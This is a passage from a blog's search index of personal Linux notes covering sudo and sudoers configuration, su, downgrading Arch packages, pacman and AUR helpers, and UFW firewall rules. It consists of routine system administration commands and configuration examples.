","permalink":"https://blog.pseudocold.com/post/2018/archiving-and-compression/","tags":["linux","macos"],"title":"命令行压缩、解压命令总结"},{"categories":["DevOps","CLI"],"contents":"sudo 使用全解。sudo -i, sudo -s, su, su -l 对比。\nFeatures of sudo\n run commands as other users grants S* privilege escalation  su v.s. sudo\n su 默认只改变 HOME 和 SHELL 变量，可以用 --login （或者更短些的 - ）来规避混合环境变量的副作用：su -。\n Command Usage 1 2 3 4 5 6 7 8  # run command as user admin sudo -u admin -- netctl start home # enter login shell, change to new $HOME sudo -i # enter interactive shell, keep $PWD sudo -s   Conf example file\n /usr/share/doc/sudo/examples/sudoers man 5 sudoers  1 2 3 4  # list conf of current user sudo -ll # list conf of specific user sudo -lU   Always visudo Always edit /etc/sudoers with visudo, which could prevent errors.\n visudo locks the sudoers file, saves edits to a temporary file, and checks that file\u0026rsquo;s grammar before copying it to /etc/sudoers.\n 1 2 3 4 5 6 7  # -c, check only sudo visudo -c sudo visudo -c -f /etc/sudoers sudo visudo # modify drop-in files sudo visudo -f /etc/sudoers.d/override   Change default editor. EDITOR is not used when VISUAL is set.\n1 2 3 4  # Reset environment by default Defaults env_reset # Set default EDITOR to nano, and do not allow visudo to use EDITOR/VISUAL. Defaults editor=/usr/bin/nano, !env_editor   Temporay change in command line\n1 2  sudo EDITOR=vim visudo sudo EDITOR=vim visudo -f /etc/sudoers.d/override.conf   Grant Privileges 假设用户名 USER_NAME，主机名 HOST_NAME.\n1 2 3 4 5 6 7 8  # full privileges USER_NAME ALL=(ALL) ALL # to a specific HOST_NAME USER_NAME HOST_NAME=(ALL) ALL # group %wheel ALL=(ALL) ALL   pattern to limit on specific commands\n1  USER_NAME HOST_NAME=/usr/bin/halt,/usr/bin/poweroff,/usr/bin/reboot,/usr/bin/pacman -Syu   Disableble password asking\n1 2 3 4  Defaults:USER_NAME !authenticate # specific commands and HOST_NAME USER_NAME HOST_NAME= NOPASSWD: /usr/bin/halt,/usr/bin/poweroff,/usr/bin/reboot,/usr/bin/pacman -Syu   /etc/sudoers default perm 1 2 3  # -c, --chages, report only when a change is made chown -c root:root /etc/sudoers chmod -c 0444 /etc/sudoers   sudoers.d drop-in visudo -f /etc/sudoers.d/custom.conf\nsudoers.d\nThe files in /etc/sudoers.d/ directory are parsed in lexicographical order, file names containing . or ~ are skipped. To avoid sorting problems, the file names should begin with two digits, e.g. 01_foo.\nsudoedit sudo -e, sudoedit edit a file as another user with current text editor. 实际为先编辑临时文件，保存时提权覆盖原文件。\nRunning a text editor as root can be a security vulnerability as many editors can run arbitrary shell commands or affect files other than the one you intend to edit. To avoid this, use sudoedit filename (equivalently, sudo --edit filename) to edit files. This edits a copy of the file using your normal user privileges and then overwrites the original using sudo only after the editor is closed. You can change the editor this uses by setting the SUDO_EDITOR environment variable:\n可通过 SUDO_EIDTOR 变量指定 sudoedit 命令的编辑器。\n1  $ export SUDO_EDITOR=vim   su v.s. sudo sudo -i, sudo -s, su, su -l Both commands sudo -i, sudo -s create a new shell. SHLVL is 1. And the environment variables from current user is kept.\nsudo -i, sudo --login use the shell from /etc/passwd from the user you\u0026rsquo;re switching to. The current dir is changed to the HOME dir of the new user.\nsudo -s, uses the SHELL var of the current user you\u0026rsquo;re running. And the cur dir is unchanged.\nWhile su, su -l don\u0026rsquo;t keep the current environment variables.\nsu use an interactive, the current working dir is unchanged.\nsu -l uses a login shell, the cur dir is changed to the new HOME.\nIn summary, sudo -i mimics su -l, sudo -s mimics su. But the sudo commands keep the user\u0026rsquo;s env vars.\nStay at same working directory when changing to sudo\n1  sudo -s   1 2 3 4 5 6 7 8 9 10 11  corrupted by user\u0026#39;s HOME=/root\tuses root\u0026#39;s PATH env vars sudo -i\tY\tY[2] Y sudo -s\tN\tY[2] Y sudo bash\tN\tY[2] Y sudo su\tY\tN[1] Y [1] PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games probably set by /etc/environment [2] PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/X11R6/bin   Formulae Pasword Prompt Timeout 1  Defaults passwd_timeout=0   Disable per-terminal sudo 1  Defaults !tty_tickets   Reuse existing session in a new terminal.\nPassing Env Var Inherit env var into sudo.\n1  sudo -E pacman -Syu   Preserve environment variables using conf.\n1  Defaults env_keep += \u0026#34;ftp_proxy http_proxy https_proxy no_proxy\u0026#34;   Passing aliases 1  alias sudo=\u0026#39;sudo \u0026#39;   Alias is not available when using sudo\n If the last character of the alias value is a space or tab character, then the next command word following the alias is also checked for alias expansion.\n Ask for root Passwd instead of User Passwd This mimics the behavior of su.\n1 2 3 4 5 6 7 8 9  # targetpw, target user, defaults to root Defaults targetpw # or Defaults rootpw # use root passwd asking in specific group Defaults:%wheel targetpw %wheel ALL=(ALL) ALL   Disable root login 不要使用，目前仅配置禁用 root SSH 登录。\n1 2 3 4 5  # lock root user from login passwd -l root # unlock root from login sudo passwd -u root   Or, edit /etc/shadow replace the encrypted passwd with !.\n1  root:!:12345::::::   Enable it again with\n1  sudo passwd root   Enable Insults easter egg, print insulting msg when sudo fails with incorrect password.\n1  Defaults insults   Troubleshooting TTY requirement Without a tty, sudo cannot disable echo when prompting for a password. 密码有泄露到标准输出。\n1 2 3  # Disable \u0026#34;ssh hostname sudo \u0026lt;cmd\u0026gt;\u0026#34;, because it will show the password in clear text. You have to run \u0026#34;ssh -t hostname sudo \u0026lt;cmd\u0026gt;\u0026#34;. # #Defaults requiretty   ssh -t will allocate a tty by force.\n据《Docker从入门到实践》推荐，不使用 tty 命令最好使用 gosu。但实际上 Vagrant 官方教程中，shell provision 使用 sudo 也没有任何问题。暂时忽略。\numask 022 v.s. 077 Downsides of umask 077?\n安全考虑，077表示完全不共享新建文件、目录。也就是交给用户自己处理。\n You will get into trouble for the umask is inherited by the sudo session, so only root will be able to access files/dirs you create. sudo can be configured to automatically set the umask the way you want\n Set a custom umask in macOS\n1 2  # user 不需要替换，只替换nnn sudo launchctl config user umask nnn   How do I tell sudo to write files with a umask of 0022?\n1 2 3 4 5  Defaults umask=0022 # default behavior: sudo will union the user\u0026#39;s umask value with its own umask (which defaults to 0022) # this can lead to situations where a utility run by sudo may create files with different permissions than if run by root directly. # Force use our custom umask, without doing a union Defaults umask_override   建议直接修改/etc/sudoers.d，这样全局有效。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # https://superuser.com/questions/79914/how-do-i-tell-sudo-to-write-files-with-a-umask-of-0022 function sudo { local old_value=$(umask) umask 0022 command sudo \u0026#34;$@\u0026#34; umask $old_value } # pass aliases to sudo # https://askubuntu.com/questions/22037/aliases-not-available-when-using-sudo # If the last character of the alias value is a space or tab character, # then the next command word following the alias is also checked for # alias expansion. alias sudo=\u0026#39;sudo \u0026#39;   Mine Conf 1 2 3 4 5 6 7 8 9  Defaults editor=/usr/bin/vim:/usr/bin/vi:/usr/bin/nano Defaults !tty_tickets # Defaults insults Defaults umask=0022 # default behavior: sudo will union the user\u0026#39;s umask value with its own umask (which defaults to 0022) # this can lead to situations where a utility run by sudo may create files with different permissions than if run by root directly. # Force use our custom umask, without doing a union Defaults umask_override   References  Sudo from Arch Wiki ","permalink":"https://blog.pseudocold.com/post/2018/sudo/","tags":["sudo","linux","macos"],"title":"Sudo"},{"categories":["DevOps","CLI","Notes"],"contents":"su 使用，个人笔记。主要理解 su 默认行为与 sudo 区别即可。\nsu, part of the core utility (util-linux), used to switch identity/account.\nUsage 1 2 3 4 5  su \u0026lt;username\u0026gt; # then input the password of the username # no username implies root user su   The default behavior of su is to remain within the current directory and to maintain the environmental variables of the original user (rather than switch to those of the new user).\nsu 默认停留在PWD，且保留原用户的环境变量。su -, su -l 抛弃原有环境变量，切换到新用户家目录。\nConfigure Check PAM\nsu v.s. sudo sudo\n more configurable prompt for you own password, not the passwd of the account you\u0026rsquo;re switching to  no need to share password between users need sudo access to use sudo    sudo options\n -s shell, stay under $PWD, mimics su -i login, change to /root, mimics su -l su -  sudo -u john -l mimics su -l john.    Note: su -, su -l is different with sudo -i. su -l discard the env vars belonging to the original user and only the ones from the new user, which doesn\u0026rsquo;t happen with sudo -i.\nTips Login Shell su -l\n switch to the home dir of the new user don\u0026rsquo;t reuse former env vars  1  alias su=\u0026#34;su -l\u0026#34;   su and wheel BSD su allows only members of the wheel user group to assume root\u0026rsquo;s identity by default. This is not the default behavior of GNU su, but this behavior can be mimicked using PAM. Uncomment the appropriate line in /etc/pam.d/su and /etc/pam.d/su-l:\n1  auth required pam_wheel.so use_uid   References  su from arch wiki ","permalink":"https://blog.pseudocold.com/post/2018/su/","tags":["linux","su"],"title":"Su Usage"},{"categories":[],"contents":"Downgrade packages in Arch.\nReferences  Downgrading packages Arch Linux Archive  Use an Earlier Pkg Cache 1  pacman -U /var/cache/pacman/pkg/package-old_version.pkg.tar.xz   Remember to ignore the pkg from being upgraded in pacman.conf.\n1  IgnorePkg=linux   Downgrade the Kernel 小心，需要同时降级\n linux linux-headers kernel modules like virtualbox-host-modules-arch-5.2.8-4-x86_64.pkg.tar.xz  Find theme in /var/cache/pacman/pkg\nArch Linux Archive ALA所能保存的历史版本有限。\nALA stores official repositories snapshots, iso images and bootstrap tarballs across time.\nYou can use it to\n Downgrade to a previous version of one package (last version is broken, I want the previous one) Restore all your packages at a precise moment (my system is broken, I want to go back 2 months ago) Find a previous version of an ISO image  https://archive.archlinux.org/\n1 2 3  ├── iso ├── packages └── repos   1  pacman -U https://archive.archlinux.org/packages/ ... packagename.pkg.tar.xz   Downgrade All Pkgs to a Specific Date 1 2 3 4 5 6 7 8 9 10 11 12  # /etc/pacman [core] SigLevel = PackageRequired Server=https://archive.archlinux.org/repos/2014/03/30/$repo/os/$arch [extra] SigLevel = PackageRequired Server=https://archive.archlinux.org/repos/2014/03/30/$repo/os/$arch [community] SigLevel = PackageRequired Server=https://archive.archlinux.org/repos/2014/03/30/$repo/os/$arch   1 2 3 4 5 6  # /etc/pacman.d/mirrorlist ## ## Arch Linux repository mirrorlist ## Generated on 2042-01-01 ## Server=https://archive.archlinux.org/repos/2014/03/30/$repo/os/$arch   1 2 3  # -yy, force refresh database # -uu, enable pkg downgrades sudo pacman -Syyuu   Tools    Name Language Features Last commit     downgrader C cache, ALA, pacman logs 201704   downgrade Bash cache, ALA 201903   agetpkg Python ALA 201705    downgrader 列出版本号的排序错误，没有修复。没有文档？！\ndowngrade 支持交互式选择。维护性最好，选它。(交互式选择弊端在于列出的旧版本有限)\nagetpk 多余简陋，需要自己查找版本号。\ndowngrade\n1 2 3 4 5 6 7 8 9 10 11  # from cache and ALA downgrade foo bar # use cache only DOWNGRADE_FROM_ALA=0 downgrade foo # use ALA only DOWNGRADE_FROM_CACHE=0 downgrade foo # favor su over sudo DOWNGRADE_FROM_ALA=0 DOWNGRADE_NOSUDO=1 downgrade foo downgrade {package}-{version}   ","permalink":"https://blog.pseudocold.com/post/2019/arch-pkg-downgrade/","tags":["linux","archlinux"],"title":"Downgrade Packages in Arch"},{"categories":["DevOps","CLI","Notes"],"contents":"pacman 使用速查，，个人笔记，非入门教程。\nCaveats Avoid refreshing the package list without upgrading the system. 不更新系统就不要刷新软件列表。\npacman -S {pkg} 并不是升级某个pkg，而是 --sysupgrade 的同时顺便升级此 pkg。\nyaourt 已经停止开发，换用其他（直接跳过介绍 yaourt 的转载文章）。根据 Archlinux 维基看来，选 yay.\nTODO\n search only not installed list outdated packages man 8 pacman  Tips Recommended Tools\n sudo pacman -Su pacman-contrib  pactree from pacman-contrib, 查询包的依赖链 paccache from pacman-contrib, 保留特定缓存（如保留一个历史版本）   expac, pacman database extraction utility. yay, AUR helper  Mirrors /etc/pacman.d/mirrorlist.\n1  Server = http://mirrors4.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch   Rank Mirrors on ArchLinux with rankmirrors Client side list ranking. (太繁琐，不推荐)\n1 2 3 4 5 6 7 8 9 10 11 12 13  # backup the original mirrorlist cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.backup # extract mirrors from specific country awk \u0026#39;/^## China$/{f=1}f==0{next}/^$/{exit}{print substr($0, 2)}\u0026#39; /etc/pacman.d/mirrorlist # for updated mirrorlist touch /etc/pacman.d/miror-china awk \u0026#39;/^## China$/{f=1}f==0{next}/^$/{exit}{print substr($0, 2)}\u0026#39; /etc/pacman.d/mirrorlist.pacnew \\  \u0026gt; /etc/pacman.d/mirror-china # rank the mirror lists rankmirrors -n 6 /etc/pacman.d/mirror-china \u0026gt; /etc/pacman.d/mirrorlist   Ranking list from remote server.（推荐此方案）\n1  curl -s \u0026#34;https://www.archlinux.org/mirrorlist/?country=CN\u0026amp;protocol=https\u0026amp;use_mirror_status=on\u0026#34; | sed -e \u0026#39;s/^#Server/Server/\u0026#39; -e \u0026#39;/^#/d\u0026#39; | rankmirrors -n 5 -   Rank Mirrors on Manjaro pacman-mirrors\n pacman-mirrors is a Manjaro specific utility for generating and maintaining the system mirrorlist. This article covers current version 4.x. Pacman-mirrors uses the information available on the Mirrorservice\n 1 2 3 4 5  sudo pacman-mirrors -i -c China -m rank # -y, --refresh, refresh cache # -yy, force refresh even if it looks like up-to-date sudo pacman -Syy   Commands Comparison with Other Package Mangers Pacman/Rosetta\nBasic Usage  Pacman Overview from Manjaro Wiki Cheatsheet of package manger man pacman pacman -S --help 查询对应operation的options  pacman-contrib pacman-contrib collects contributed scripts and tools for pacman systems. Some useful commands are separated to pacman-contrib, like pactree, checkupdates.\n1 2 3 4  sudo pacman -Su pacman-contrib # grep commands from pcaman repo and pacman-contrib repo pacman -Ql pacman pacman-contrib | grep -E \u0026#39;bin/.+\u0026#39;   Upgrade System upgrade\n1 2 3 4 5 6 7  # update system # -S, -sync # -u, --sysupgrade, upgrades all outdated pkgs # -uu, allow pkg downgrades. Mainly for downgrades back from testing. # -y, --refresh, refresh cache # -yy, force refresh even if it looks like up-to-date sudo pacman -Syyu   Upgrade outdated pkg\n1 2 3 4  # list outdated pacman -Qu # upgrade pkg pacman -U pkg   Search -S, searching both in packages' names and descriptions. Use option -s for extended regular expression.\n1 2 3 4  # search pkgs on the server pacman -Ss \u0026lt;package\u0026gt; pacman -Ss \u0026#39;^vim-\u0026#39;   Search in local installed packages\n1 2 3 4 5 6 7 8 9 10  # local installed pacman -Qs \u0026lt;package\u0026gt; # list pkg info pacman -Qi \u0026lt;package\u0026gt; # more info with backup files and their modification states pacman -Qii \u0026lt;package\u0026gt; # list pkg contents pacman -Ql pkg # check the presense pacman -Qk package_name   Search where a command/file belongs to with -F, query from package database (remote info, no need to install the pkg)\n1 2 3 4 5 6 7 8 9  # https://www.reddit.com/r/archlinux/comments/4nj101/how_do_i_find_what_package_a_program_belongs_to/ # build the separate search db pacman -Fy pacman -Fs filename/command # lookup the owner of the file pacman -Fo filename # list pkg content pacman -Fl ufw-extras   1 2  ❯ pacman -Fo /etc/services etc/services is owned by core/iana-etc 20190329-1   Contents 1 2  # list files/contents of a pkg pacman -Ql \u0026lt;package\u0026gt;   Install 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  sudo pacman -Syu {package_name} # --force virtualbox-guest-utils # --needed, don\u0026#39;t reinstall already installed pkgs, skip existing package # --noconfirm, yes to all prompt # list files sudo pacman -Syuw \u0026lt;package\u0026gt; # install from AUR, use yay, a wrapper for pacman # -S, --sync yay -S \u0026lt;package\u0026gt; # install package from local storage sudo pacman -U /path/to/package.pkg.tar.xz sudo pacman http://localtion.com/repo/package.tar.xz # install a list of package pacman -S $(pacman -Ssq package_regex) # 指定安装源 repo pacman -S extra/package_name # bracket expansion pacman -S plasma-{workspace{,-wallpapers},pa} # 按需安装 pacman -S --noconfirm pkg # do not reinstall up-to-date packages pacman -S --needed pkg   Install Optional Dependencies 1 2 3 4 5 6 7 8  # 貌似没有简单的方法如 +dep1 ，只能先查询，再手动选择 pacman -Si xdg-utls # list optional dependencies in the pkg info pacman -Si {pkg} # 自行安装可选依赖 pacman -S xdg-open perl-file-mimeinfo   Package Group 1 2  # list group entries pacman -Sg gnome   Select pkgs within a group with patterns like 1-10 ^6-8\n In addition to packages, groups can be specified as well. For example, if gnome is a defined package group, then pacman -S gnome will provide a prompt allowing you to select which packages to install from a numbered list. The package selection is specified using a space separated list of package numbers. Sequential packages may be selected by specifying the first and last package numbers separated by a hyphen (-). Excluding packages is achieved by prefixing a number or range of numbers with a caret (^).\n Check the FAQ for the difference between meta package and package group.\nMeta Package 1 2 3 4  # list meta package # -q, suppress pkg version # -e, --explicit pacman -Qqe | grep meta   Remove/uninstall 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  pacman -R --help sudo pacman -R \u0026lt;package\u0026gt; # --nodeps, skip dependency check sudo pacman -Rd pkg # recursive removal with dependencies sudo pacman -Rs \u0026lt;package\u0026gt; # rucursive removal, including backup configurations generated by pacman # -n, --nosave sudo pacman -Rns \u0026lt;package\u0026gt; # dependents and dependencies # -c, --cascade, remove dependents # remove dependencies and dependents pacman -Rsc package_name # -d, skip dependency check # -dd, skip all checks pacman -Rdd pkg   Uninstall Package Groups pacman 没有内置移除包组的办法。因为不同于元包，包组为逻辑上的组，需包管理器支持。\n以下方式本质上都是先列出包组合内所有包，依次交给 pacman 卸载掉。\n1 2 3 4 5 6 7 8 9  # https://bbs.archlinux.org/viewtopic.php?id=117144 # list a group (installed) of files quietly (better) pacman -Qgq xorg-drivers \u0026gt; pkglist # https://www.ostechnix.com/the-easy-way-to-install-and-remove-a-package-group-in-arch-linux/ # 联网查询安装包URL，然后格式输出包名 pacman -Sp deepin --print-format \u0026#39;%n\u0026#39; --needed \u0026gt; install.txt # 读入包组中所有包列表，并卸载 sudo pacman -Rs - \u0026lt; install.txt   Dependency Queries 1 2 3 4 5 6 7 8 9 10 11 12 13 14  # check dependencies, with pactree from pacman-contrib pactree \u0026lt;package\u0026gt; # check dependents pactree -r pkg # from pkgtools (AUR) whoneeds pkg # depth 1 pactree -d1 vim # list all pkg installed as dependencies pacman -Qd   Orphans 孤儿包：未被显式安装，且当前不被任何其他包依赖的包。\n1 2 3 4 5 6 7  # list orphans # -d, --deps, installed as dependencies. Converse to -e, --explict. # -t, --unrequired pacman -Qdt # remove orphans sudo pacman -Rs $(pacman -Qdtq)   Use Hook to Detect Orphans  Add the following command to a pacman post-transaction hook to be notified if a transaction orphaned a package. This can be useful for being notified when a package has been dropped from a repository, since any dropped package will also be orphaned on a local installation.\n 1 2 3 4 5 6  # man 5 alpm-hooks # .hook ext is required # /etc/pacman.d/hooks/example.hook Exec /usr/bin/bash -c \u0026#34;/usr/bin/pacman -Qtd || /usr/bin/echo \u0026#39;=\u0026gt; None found.\u0026#39;\u0026#34;   Leaves Leaves: explicit installed pkgs.\n1 2 3 4 5 6 7 8 9  # explicitly installed and not required by other # -e, --explicit pacman -Qe # -t, --unrequired pacman -Qet # optional required: -tt pacman -Qtt   Convert between Dependent and Dependency 1 2 3 4 5 6  # install as an orphan, or a leaf explicitly. pacman -S --asdeps # Mark a installed pkg as installed explicitly. # -D, operate on the package database only pacman -D --asexplicit pkgg   Cache Cleaning Cache location: /var/cache/pacman/pkg/.\n默认并不推荐清除所有缓存，以方便回滚。paccache -r (from pacman-contrib) 保留最近3版本。\n1 2 3 4 5 6 7  paccache -h # keep 1 version paccache -rk1 # remove cache of uninstalled pkgs paccache -ruk0   1 2 3 4 5  # remove all cache of uninstalled pkg and unused db sudo pacman -Sc # aggressive, clear cache completely (use with care) sudo pacman -Scc   Advanced Usage 1 2 3 4  # download but don\u0026#39;t install pacman -Sw pkg pacman -U protocal://path/to/pkg # install from url   Downgrade 1 2 3  # https://wiki.archlinux.org/index.php/downgrading_packages # aur pkg downgrade pacman -S downgrade   Ports: Arch Build System (ABS) Arch Build System\n makpkg asp  A ports-like source packaging system that compiles source tarballs into binary packages with customization support. Arch Build System makepkg tool can be used to create custom pkg.tar.xz packages from third-party sources.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # based on git sudo pacman -S asp asp export pacman testing/systemd extra/pkgfile # asp checkout pkgfile # a fully functinal check # asp list-repos pacman # list packages # cache: ${XDG_CACHE_HOME:-$HOME/.cache}/asp # modify the PKGBUILD # put the modified pkg into another group groups=(\u0026#39;modified\u0026#39;) # exclude \u0026#39;modified\u0026#39; group from being updated # /etc/pacman.conf IgnoreGroup = modified # config with /etc/makepkg.conf or $XDG_CONFIG_HOME/pacamn/makepkg.conf, or ~/.makeconfig CFLAGS=\u0026#34;-march=native -O2 -pipe -fstack-protector-strong -fno-plt\u0026#34; CXXFLAGS=\u0026#34;${CFLAGS}\u0026#34; makepkg makepkg --install # same as pacman -U pkgname-pkgver.pkg.tar.xz   AUR  The Arch User Repository (AUR) is a community-driven repository for Arch users. It contains package descriptions (PKGBUILDs) that allow you to compile a package from source with makepkg and then install it via pacman.\n AUR 只是一个 repo，手动拉取配合 PKGBUILD 文件即可构建所需 app。更常规的做法是使用线程的工具，自动完成这些操作。yaourt 是曾经被广泛使用的 AUR helper，但已停止开发，请换用其他。\n注：直接跳过转载 yaourt 使用的脑残文章。\nAUR Helpers\n aurutils, search and build. yay, pacman wrapper 中完成度最高 \u0026hellip;  pacman wrapper，如 yay，尝试包装原有的 pacman。使用相同的安装、卸载子命令，自动完成拉取，构建，安装来自于 AUR 的应用这一过程。\n pacman wrappers abstract the work of the package manager. They may (optionally or by default) introduce unsafe flags, or other unexpected behavior leading to a defective system.\n 批量交互：批量完成交互过程，特别是：（2，3需要手动开启）\n 检查PKGBUILD； 显示要升级的包； 解决包冲突和安装问题。  GUI: Pamac 推荐配置\n 关闭自动检查更新 开启降级 开启AUR  Arch User Repository\n1 2 3 4 5  pamac serarch -a \u0026lt;package\u0026gt; pamac build visual-studio-code-bin # upgrade all installed pamac upgrade -a   CLI: yay 1 2 3 4 5 6 7  yay {search_term} # print statistics yay -Ps # clean unneeded dependencies yay -Yc   Config\nEnable Color in pacman.conf.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # $XDG_CONFIG_HOME/yay/config.json # or $HOME/.config/yay/config.json # PERMANENT CONFIGURARION SETTINGS # --save save conf used in the commands into config.json # generate config with yay --save --aururl \u0026#34;https://aur.tuna.tsinghua.edu.cn\u0026#34; -Ps aururl builddir eidtor editorflags # aur and pacman packages upgrade has been separated by default # https://github.com/Jguer/yay/commit/3bdb5343218d99d40f8a449b887348611f6bdbfc # --combinedupgrade to enable the integrated upgrade behavior # set aururl and enable combinedugrade # test with yay -S bfg # depends on jre-openjdk   Pacman Configuration Order of repositories in the configuration file matters.\narchlinuxcn 开启 archlinuxcn。（非官方仓库，包含了一些常用的中文软件。）\n sudo pacman -Sy archlinuxcn-keyring 添加源，/etc/pacman.conf 1 2  [archlinuxcn] # Server = https://cdn.repo.archlinuxcn.org/$arch    使用镜像，archlinuxcn-mirrorlist-git 包中汇总了一系列镜像。但没必要，直接找到镜像，写入即可 1 2 3 4  # /etc/pacman.conf [archlinuxcn] Server = https://mirrors4.tuna.tsinghua.edu.cn/archlinuxcn/$arch # Server = https://cdn.repo.archlinuxcn.org/$arch     Verbose List 1 2 3 4 5  [options] Color # list detail in pacman -Syu VerbosePkgList   Prevent Specific Package Being Upgraded Pin/hold back packages from being upgraded\n1 2 3 4 5 6 7  # /etc/pacman.conf IgnorePkg=package-name IgnoreGroup=gnore # new file will be named as file.pacnew # No leading slash, relative to archive NoUpgrade=path/to/file   SigLevel = Required DatabaseOptional, enables signature verification for all the packages on a global level: this can be overridden by per-repository SigLevel lines.\nFAQ Meta Package v.s. Package Group Both of them provide similar functionality to enable multiple related packages to be installed or uninstalled simultaneously.\n   The advantage of a meta package, compared to a group, is that any new member packages will be installed when the meta package itself is updated with a new set of dependencies. This is in contrast to a group where new group members will not be automatically installed.\n  The disadvantage of a meta package is that it is not as flexible as a group; you can choose which group members you wish to install but you cannot choose which meta package dependencies you wish to install.\n   Another difference is how they are defined.\n Groups and metapackages are a solutions to a similar problem, but technically they are very different:\n A group is a logical group of packages. When you install a group, each package that is contained in the group gets installed. Groups are a concept supported by your package manager A metapackage is an empty package (i.e. no files are installed) that depends on a bunch of packages. When a metapackage is installed, each dependency gets installed. This does not need special support from the package manager   References  Pacman wiki from archlinux Sorting mirrors Meta package and package group from archlinux wiki How do you list installed meta packages on Arch Linux? Downgrade packages with pacman Arch User Repository AUR Helpers ","permalink":"https://blog.pseudocold.com/post/2019/pacman-notes/","tags":["archlinux","pacman"],"title":"Pacman Notes"},{"categories":["DevOps","CLI","Notes"],"contents":"UFW (Uncomplicated Firewall) 使用速查，个人笔记，非入门教程。\nUncomplicated Firewall, is an interface to iptables that is geared towards simplifying the process of configuring a firewall. While iptables is a solid and flexible tool, it can be difficult for beginners to learn how to use it to properly configure a firewall.\nQuick Start 1 2 3 4 5 6  pacman -S ufw # gufw for GUI # pacman -S gufw systemctl enable --now ufw   1 2 3 4 5 6 7 8 9 10 11 12 13 14  # install ufw sudo vim /etc/default/ufw # Enable IPv6 support. Default on, no need to do it. IPV6=yes # 默认已经配置了，无需再来一遍 sudo ufw default deny incoming sudo ufw default allow outgoing # ssh 请直接使用limit # sudo ufw allow \u0026lt;port\u0026gt;/\u0026lt;optional: protocol\u0026gt; sudo ufw allow ssh # find port from /etc/services sudo ufw allow 22 # equivalent sudo ufw limit \u0026#39;OpenSSH\u0026#39; # sudo ufw app list   Note:\n /etc/services, this file list all kinds of services and their corresponding ports. 1 2  ❯ pacman -Fo /etc/services /etc/services is owned by core/iana-etc 20190329-1    By default, UFW allows ping requests. allow 规则默认针对 incoming，因为outgoing默认是开启的，且没必要限制 deny is different with reject, deny drops the packets --dry-run, a useful option  常用命令、规则示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  # continue ufw setup sudo ufw enable # activate ufw sudo ufw disable # disable sudo ufw reset # reset all rules sudo ufw status verbose # show raw iptables rules sudo ufw show raw sudo ufw status numbered # order by number 规则序列号 sudo ufw allow http # sudo ufw allow 80 实际是设置端口规则 sudo ufw allow https # sudo ufw allow 443 # 如何区分 in out 分别设置规则 sudo ufw allow in on eth1 to any port 3306 # any指代IP # 区分udp tcp # 80/udp http/tcp sudo ufw allow proto tcp from any to any port 80,443 # limit IPv6 only, 直接使用ipv6地址 # proto ipv6, is for IPv6 over IPv4 tunnels and 6to4 # range sudo ufw allow 6000:6007/tcp sudo ufw allow 6000:6007/udp sudo ufw allow from \u0026lt;target\u0026gt; to \u0026lt;destination\u0026gt; port \u0026lt;port number\u0026gt; sudo ufw allow from \u0026lt;target\u0026gt; to \u0026lt;destination\u0026gt; port \u0026lt;port number\u0026gt; proto \u0026lt;protocol name\u0026gt; sudo ufw allow proto tcp from any to any port 80,443 # IP sudo ufw allow from 203.0.113.4 sudo ufw allow from 203.0.113.4 to any port 22 sudo ufw allow from 203.0.113.0/24 sudo ufw allow from 203.0.113.0/24 to any port 22 # network interface ip addr show sudo ufw allow in on etho0 to any port 80 sudo ufw allow in on {network_interface} to any port 3306 # mysql # deny sudo ufw deny from \u0026lt;ip address\u0026gt; to \u0026lt;ip\u0026gt; port \u0026lt;port number\u0026gt; sudo ufw deny http sudo ufw deny from 203.0.113.4 sudo ufw status numbered # order by number 规则序列号 sudo ufw delete 2 # 把原规则再输入一遍删除 sudo ufw delete allow http # allow http is the actual rule   Common services and ports    Service Port TCP/UDP     ssh 22    sftp 115    rsync 873    http 80    https 443    mysql 3306    postgresql 5432    smtp 25    imap 143    imaps 993    pop3 110    pop3s 995     Numbered rules 既然有number，就说明有优先级存在。\n1  sudo ufw insert 1 allow from \u0026lt;ip address\u0026gt;   logging 1 2  sudo ufw logging on sudo ufw logging off   Recommended: Disabling logging may be useful to stop UFW filling up the kernel (dmesg) and message logs.\nVPN and Forwarding Enable forwarding for VPN like OpenVPN, WireGuard.\n1 2  # /etc/default/ufw DEFAULT_FORWARD_POLICY=\u0026#34;ACCEPT\u0026#34;   Pre-Definde App Policy The PKG comes with some defaults based on the default ports of many common daemons and programs.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ufw app list ❯ ls -al /etc/ufw/applications.d total 52 drwxr-xr-x 2 root root 4096 Apr 2 23:22 . drwxr-xr-x 3 root root 4096 Apr 2 23:21 .. -rw-r--r-- 1 root root 129 Mar 26 18:10 mosh -rw-r--r-- 1 root root 349 Dec 25 10:27 ufw-bittorent -rw-r--r-- 1 root root 627 Dec 25 10:27 ufw-chat -rw-r--r-- 1 root root 513 Dec 25 10:27 ufw-directoryserver -rw-r--r-- 1 root root 89 Dec 25 10:27 ufw-dnsserver -rw-r--r-- 1 root root 358 Dec 25 10:27 ufw-fileserver -rw-r--r-- 1 root root 212 Dec 25 10:27 ufw-loginserver -rw-r--r-- 1 root root 524 Dec 25 10:27 ufw-mailserver -rw-r--r-- 1 root root 131 Dec 25 10:27 ufw-printserver -rw-r--r-- 1 root root 155 Dec 25 10:27 ufw-proxyserver -rw-r--r-- 1 root root 320 Dec 25 10:27 ufw-webserver   Custom app policy/rule. Don\u0026rsquo;t override pre-defined rules.\n1 2 3 4 5 6 7 8  # /etc/ufw/applications.d/custom [Deluge-my] title=Deluge description=Deluge BitTorrent client ports=20202:20205/tcp # ports=10000:10002/tcp|10003/udp # ports=10000:10002/tcp|10003,10009/udp   1 2 3  # enable custom application rule ufw delete allow Deluge ufw allow Deluge-my   Blacklist IP Addresses 1 2 3 4 5 6 7 8 9 10  # /etc/ufw/before.rules ... # blacklist section # block just 199.115.117.99 -A 